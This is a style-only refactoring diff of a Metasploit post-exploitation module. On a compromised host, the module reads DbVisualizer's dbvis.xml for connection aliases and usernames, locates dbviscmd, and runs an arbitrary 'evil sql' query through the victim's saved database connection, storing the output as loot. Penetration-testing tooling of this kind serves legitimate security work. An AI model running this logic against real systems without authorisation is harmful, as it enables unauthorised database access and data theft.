@@ -26,7 +26,7 @@ class MetasploitModule < Msf::Post
         'References' => [
           ['URL', 'http://youtu.be/0LCLRVHX1vA']
         ],
-        'Platform' => %w{linux win},
+        'Platform' => %w[linux win],
         'SessionTypes' => [ 'meterpreter' ],
         'Compat' => {
           'Meterpreter' => {
@@ -47,9 +47,9 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    db_type = exist_and_supported()
+    db_type = exist_and_supported
     unless db_type.blank?
-      dbvis = find_dbviscmd()
+      dbvis = find_dbviscmd
       unless dbvis.blank?
         dbvis_query(dbvis, datastore['QUERY'])
       end
@@ -57,14 +57,14 @@ class MetasploitModule < Msf::Post
   end
 
   # Check if the alias exist and if database is supported by this script
-  def exist_and_supported()
+  def exist_and_supported
     case session.platform
     when 'linux'
-      user = session.shell_command("whoami")
+      user = session.shell_command('whoami')
       print_status("Current user is #{user}")
 
       if (user =~ /root/)
-        user_base = "/root/"
+        user_base = '/root/'
       else
         user_base = "/home/#{user}/"
       end
@@ -78,7 +78,7 @@ class MetasploitModule < Msf::Post
     unless file?(dbvis_file)
       # File not found, we next try with the old config path
       print_status("File not found: #{dbvis_file}")
-      print_status("This could be an older version of dbvis, trying old path")
+      print_status('This could be an older version of dbvis, trying old path')
 
       case session.platform
       when 'linux'
@@ -96,7 +96,7 @@ class MetasploitModule < Msf::Post
     end
 
     print_status("Reading : #{dbvis_file}")
-    raw_xml = ""
+    raw_xml = ''
     begin
       raw_xml = read_file(dbvis_file)
     rescue EOFError
@@ -114,37 +114,30 @@ class MetasploitModule < Msf::Post
     raw_xml.each_line do |line|
       if line =~ /<Database id=/
         db_found = true
-      elsif line =~ /<\/Database>/
+      elsif line =~ %r{</Database>}
         db_found = false
       end
 
-      if db_found == true
+      next unless db_found == true
 
-        # checkthe alias
-        if (line =~ /<Alias>([\S+\s+]+)<\/Alias>/i)
-          if datastore['DBALIAS'] == $1
-            alias_found = true
-            print_good("Alias #{datastore['DBALIAS']} found in dbvis.xml")
-          end
-        end
+      # checkthe alias
+      if (line =~ %r{<Alias>([\S+\s+]+)</Alias>}i) && (datastore['DBALIAS'] == ::Regexp.last_match(1))
+        alias_found = true
+        print_good("Alias #{datastore['DBALIAS']} found in dbvis.xml")
+      end
 
-        if (line =~ /<Userid>([\S+\s+]+)<\/Userid>/i)
-          if alias_found
-            print_good("Username for this connection : #{$1}")
-          end
-        end
+      if (line =~ %r{<Userid>([\S+\s+]+)</Userid>}i) && alias_found
+        print_good("Username for this connection : #{::Regexp.last_match(1)}")
+      end
 
-        # check the type
-        if (line =~ /<Type>([\S+\s+]+)<\/Type>/i)
-          if alias_found
-            db_type = $1
-            alias_found = false
-          end
-        end
+      # check the type
+      if (line =~ %r{<Type>([\S+\s+]+)</Type>}i) && alias_found
+        db_type = ::Regexp.last_match(1)
+        alias_found = false
       end
     end
     if db_type.blank?
-      print_error("Database alias not found in dbvis.xml")
+      print_error('Database alias not found in dbvis.xml')
     end
     return db_type # That is empty if DB is not supported
   end
@@ -153,9 +146,9 @@ class MetasploitModule < Msf::Post
   def find_dbviscmd
     case session.platform
     when 'linux'
-      dbvis = session.shell_command("locate dbviscmd.sh").chomp
-      if dbvis.chomp == ""
-        print_error("dbviscmd.sh not found")
+      dbvis = session.shell_command('locate dbviscmd.sh').chomp
+      if dbvis.chomp == ''
+        print_error('dbviscmd.sh not found')
         return nil
       else
         print_good("Dbviscmd found : #{dbvis}")
@@ -164,7 +157,7 @@ class MetasploitModule < Msf::Post
       # Find program files
       progfiles_env = session.sys.config.getenvs('ProgramFiles(X86)', 'ProgramFiles')
       progfiles_x86 = progfiles_env['ProgramFiles(X86)']
-      if not progfiles_x86.blank? and progfiles_x86 !~ /%ProgramFiles\(X86\)%/
+      if !progfiles_x86.blank? && progfiles_x86 !~ (/%ProgramFiles\(X86\)%/)
         program_files = progfiles_x86 # x64
       else
         program_files = progfiles_env['ProgramFiles'] # x86
@@ -181,12 +174,12 @@ class MetasploitModule < Msf::Post
         end
       end
       if dbvis_home_dir.blank?
-        print_error("Dbvis home not found, maybe uninstalled ?")
+        print_error('Dbvis home not found, maybe uninstalled ?')
         return nil
       end
       dbvis = "#{program_files}\\#{dbvis_home_dir}\\dbviscmd.bat"
       unless file?(dbvis)
-        print_error("dbviscmd.bat not found")
+        print_error('dbviscmd.bat not found')
         return nil
       end
       print_good("Dbviscmd found : #{dbvis}")
@@ -200,24 +193,24 @@ class MetasploitModule < Msf::Post
     resp = ''
     if file?(dbvis) == true
       f = session.fs.file.stat(dbvis)
-      if f.uid == Process.euid or Process.groups.include? f.gid
-        print_status("Trying to execute evil sql, it can take time ...")
+      if (f.uid == Process.euid) || Process.groups.include?(f.gid)
+        print_status('Trying to execute evil sql, it can take time ...')
         args = "-connection #{datastore['DBALIAS']} -sql \"#{sql}\""
         dbvis = "\"#{dbvis}\""
         cmd = "#{dbvis} #{args}"
         resp = cmd_exec(cmd)
-        print_line("")
-        print_line("#{resp}")
+        print_line('')
+        print_line(resp.to_s)
         # store qury and result
         p = store_loot(
-          "dbvis.query",
-          "text/plain",
+          'dbvis.query',
+          'text/plain',
           session,
           resp.to_s,
-          "dbvis_query.txt",
-          "dbvis query"
+          'dbvis_query.txt',
+          'dbvis query'
         )
-        print_good("Query stored in: #{p.to_s}")
+        print_good("Query stored in: #{p}")
       else
         print_error("User doesn't have enough rights to execute dbviscmd, aborting")
       end
